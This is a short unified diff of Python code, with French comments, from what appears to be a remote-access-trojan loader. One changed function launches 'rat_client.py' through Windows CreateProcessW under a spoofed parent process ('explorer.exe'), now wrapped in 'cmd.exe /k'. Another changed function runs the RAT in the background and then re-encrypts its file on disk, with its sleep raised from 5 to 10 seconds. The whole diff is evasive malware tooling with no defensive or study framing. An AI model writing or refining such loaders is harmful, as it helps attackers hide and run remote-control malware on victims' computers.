@@ -177,7 +177,7 @@ def launch_with_ppid_spoofing(target_script, parent_name="explorer.exe"):
 
     # 7) Création du processus
     pi = PROCESS_INFORMATION()
-    command = f'"{sys.executable}" --autorun "{target_script}"'
+    command = f'cmd.exe /k "{sys.executable} {target_script}"'
 
     success = kernel32.CreateProcessW(
         None,
@@ -215,7 +215,7 @@ def executer_et_rechiffrer():
     print(f"[*] Exécution de rat_client.py en arrière-plan : {abs_path}")
 
     launch_with_ppid_spoofing(abs_path)
-    time.sleep(5)
+    time.sleep(10)
     print("[*] Rechiffrement après exécution (immédiat, processus lancé en background)")
     chiffrer_fichier(source_file=abs_path)
 
